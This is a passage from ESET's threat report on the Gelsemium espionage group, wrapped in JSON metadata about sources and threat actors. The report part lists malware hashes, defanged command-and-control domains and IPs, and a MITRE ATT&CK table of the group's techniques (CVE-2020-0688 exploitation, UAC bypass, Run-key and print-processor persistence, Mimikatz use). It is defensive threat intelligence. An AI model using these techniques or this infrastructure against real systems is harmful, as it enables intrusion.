Gelsenicine\n\n`F04FEB22EFAA8F401470FA5808ADAB9B35E87C4C` `Win32/Gelsemium.A` Gelsenicine\n\n`2668050FCAD373FCD548792D9793375E4D704BEF` `Win64/Agent.WT` OwlProxy HTTP proxy.\n\n`762F73329FF2EBE2B8F55205F886CB5F1DE99483` `Win32/Agent.ACJS` Chrommme backdoor.\n\n\n-----\n\n### C&C servers\n```\n149.248.14[.]53\n210.209.72[.]180\n4vw37z[.]cn\nacro.ns1[.]name\ndomain.dns04[.]com\ninfo.96html[.]com\nmicrosoftservice.dns1[.]us\npctftp.otzo[.]com\nsitesafecdn.hopto[.]org\ntraveltime.hopto[.]org\nwww.sitesafecdn.dynamic-dns[.]net\nwww.travel.dns04[.]com\n\n## MITRE ATT&CK TECHNIQUES\n\n```\n[Note: This table was built using version 9 of the MITRE ATT&CK framework.](https://attack.mitre.org/resources/versions/)\n\nTactic ID Name Description\n\nGelsemium exploits the vulnerability CVE-2020_[T1190](https://attack.mitre.org/versions/v9/techniques/T1190/)_ Exploit Public-Facing Application\n0688.\n\n\nInitial Access\n\nExecution\n\nPersistence\n\n\n_[T1566.001](https://attack.mitre.org/versions/v9/techniques/T1566/001/)_ Phishing: Spearphishing Attachment Gelsemium uses phishing documents.\n\nSupply Chain Compromise: Compromise\n_[T1195.002](https://attack.mitre.org/versions/v9/techniques/T1195/002/)_ Gelsemium uses supply-chain attacks.\nSoftware Supply Chain\n\nCommand and Scripting Interpreter:\n_[T1059.003](https://attack.mitre.org/versions/v9/techniques/T1059/003/)_ Gelsemium relies on a batch script to delete itself.\nWindows Command Shell\n\nGelsemium has exploited client software\n_[T1203](https://attack.mitre.org/versions/v9/techniques/T1203/)_ Exploitation for Client Execution vulnerabilities for execution, such as CVE-2012-0158\nand CVE-2020-0688.\n\n\nInter-Process Communication: Component\n_[T1559.001](https://attack.mitre.org/versions/v9/techniques/T1559/001/)_\nObject Model\n\nBoot or Logon Autostart Execution:\n_[T1547.001](https://attack.mitre.org/versions/v9/techniques/T1547/001/)_\nRegistry Run Keys / Startup Folder\n\n\nGelsemium bypasses UAC via an exploit based on the\n```\nIARPUninstallStringLauncher COM interface.\n\n```\nGelsemium uses HKCU\\Software\\Microsoft\\\n```\nWindows\\CurrentVersion\\Run key to persist\n\n```\nafter reboot.\n\n\nBoot or Logon Autostart Execution: Print Gelsemium uses print processors to persist after\n_[T1547.012](https://attack.mitre.org/versions/v9/techniques/T1547/012/)_\nProcessors reboot.\n\nAbuse Elevation Control Mechanism:\nPrivilege Escalation _[T1548.002](https://attack.mitre.org/versions/v9/techniques/T1548/002/)_ Gelsemium uses exploits to bypass UAC.\nBypass User Account Control\n\nAbuse Elevation Control Mechanism:\n_[T1548.002](https://attack.mitre.org/versions/v9/techniques/T1548/002/)_ Gelsemium uses exploits to bypass UAC.\nBypass User Account Control\n\nDeobfuscate/Decode Files or Gelsemium uses RC4 and custom algorithms to\n_[T1140](https://attack.mitre.org/versions/v9/techniques/T1140/)_\nInformation encrypt and decrypt files and blob.\n\n_[T1070.004](https://attack.mitre.org/versions/v9/techniques/T1070/004/)_ Indicator Removal on Host: File Deletion [Gelsemium remove its first stage after being ]\nexecuted.\n\nDefense Evasion\n\n_[T1070.006](https://attack.mitre.org/versions/v9/techniques/T1070/006/)_ Indicator Removal on Host: Timestomp Gelsemium uses timestomping.\n\nGelsemium uses registry to store config and\n_[T1112](https://attack.mitre.org/versions/v9/techniques/T1112/)_ Modify Registry\nencrypted plug-ins.\n\nObfuscated Files or Information: Binary Gelsemium uses junk code to make static and\n_[T1027.001](https://attack.mitre.org/versions/v9/techniques/T1027/001/)_\nPadding dynamic analysis harder.\n\nCredential Access _[T1003](https://attack.mitre.org/versions/v9/techniques/T1003/)_ Use Alternate Authentication Material Gelsemium operators were seen using Mimikatz.\n\n\n-----\n\nTactic ID Name Description\n\nApplication Layer Protocol: Web Gelsemium uses HTTP to communicate with the\n_[T1071.001](https://attack.mitre.org/versions/v9/techniques/T1071/001/)_\nProtocols C&C server.\n\nGelsemium uses DNS to communicate with the\n_[T1071.004](https://attack.mitre.org/versions/v9/techniques/T1071/004/)_ Application Layer Protocol: DNS\nC&C server.\n\n\nCommand\nAnd Control\n\n\nEncrypted Channel: Symmetric Gelsemium uses XOR routine to encrypt\n_[T1573.001](https://attack.mitre.org/versions/v9/techniques/T1573/001/)_\nCryptography communication with the C&C server.\n\n_[T1008](https://attack.mitre.org/versions/v9/techniques/T1008/)_ Fallback Channels Gelsemium uses fallback C&C server.\n\nGelsemium uses raw socket to communicate\n_[T1095](https://attack.mitre.org/versions/v9/techniques/T1095/)_ Non-Application Layer Protocol\nwith the C&C server.\n\n_[T1571](https://attack.mitre.org/versions/v9/techniques/T1571/)_ Non-Standard Port Gelsemium uses non-standard ports like 8080.\n\n\n-----\n\n## ABOUT ESET\n\nFor more than 30 years, ESET® has been developing industry-leading IT security software and\n\nservices to protect businesses, critical infrastructure and consumers worldwide from increasingly\n\nsophisticated digital threats. From endpoint and mobile security to endpoint detection and response,\n\nas well as encryption and multifactor authentication, ESET’s high-performing, easy-to-use solutions\n\nunobtrusively protect and monitor 24/7, updating defenses in real time to keep users safe and\n\nbusinesses running without interruption. Evolving threats require an evolving IT security company\n\nthat enables the safe use of technology. This is backed by ESET’s R&D centers worldwide, working\n\n[in support of our shared future. For more information, visit www.eset.com or follow us on LinkedIn,](http://www.eset.com)\n\n_[Facebook and Twitter.](https://www.facebook.com/eset?ref=br_tf)_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://www.welivesecurity.com/wp-content/uploads/2021/06/eset_gelsemium.pdf"
    ],
    "report_names": [
        "eset_gelsemium.pdf"
    ],
    "threat_actors": [
        {
            "id": "77874718-7ad2-4d15-9831-10935ab9bcbe",
            "created_at": "2022-10-25T15:50:23.619911Z",
            "updated_at": "2025-03-27T02:00:55.50722Z",
            "deleted_at": null,
            "main_name": "Gelsemium",
            "aliases": [
                "Gelsemium"
            ],
            "source_name": "MITRE:Gelsemium",
            "tools": [
                "Gelsemium",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2d4d2356-8f9e-464d-afc6-2403ce8cf424",
            "created_at": "2023-01-06T13:46:39.290101Z",
            "updated_at": "2025-03-27T02:00:03.041564Z",
            "deleted_at": null,
            "main_name": "Gelsemium",
            "aliases": [
                "狼毒草"
            ],
            "source_name": "MISPGALAXY:Gelsemium",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "068b67c8-604c-4272-b808-350413fa9ee3",
            "created_at": "2022-10-25T16:07:23.975708Z",
            "updated_at": "2025-03-27T02:02:10.058689Z",
            "deleted_at": null,
            "main_name": "Operation NightScout",
            "aliases": [],
            "source_name": "ETDA:Operation NightScout",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "b5550c4e-943a-45ea-bf67-875b989ee4c4",
            "created_at": "2022-10-25T16:07:23.675771Z",
            "updated_at": "2025-03-27T02:02:09.918749Z",
            "deleted_at": null,
            "main_name": "Gelsemium",
            "aliases": [
                "Operation NightScout",
                "Operation TooHash"
            ],
            "source_name": "ETDA:Gelsemium",
            "tools": [
                "ASPXSpy",
                "ASPXTool",
                "Agentemis",
                "BadPotato",
                "CHINACHOPPER",
                "China Chopper",
                "Chrommme",
                "Cobalt Strike",
                "CobaltStrike",
                "FireWood",
                "Gelsemine",
                "Gelsenicine",
                "Gelsevirine",
                "JuicyPotato",
                "OwlProxy",
                "Owowa",
                "SAMRID",
                "SessionManager",
                "SinoChopper",
                "SpoolFool",
                "SweetPotato",
                "WolfsBane",
                "cobeacon",
                "reGeorg"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041538,
    "ts_creation_date": 1623661312,
    "ts_modification_date": 1623661320,
    "files": {
        "pdf": "https://archive.orkl.eu/e189bd6b2f7a00f2a834e268ac8196e0a3e7dc84.pdf",
        "text": "https://archive.orkl.eu/e189bd6b2f7a00f2a834e268ac8196e0a3e7dc84.txt",
        "img": "https://archive.orkl.eu/e189bd6b2f7a00f2a834e268ac8196e0a3e7dc84.jpg"
    }
}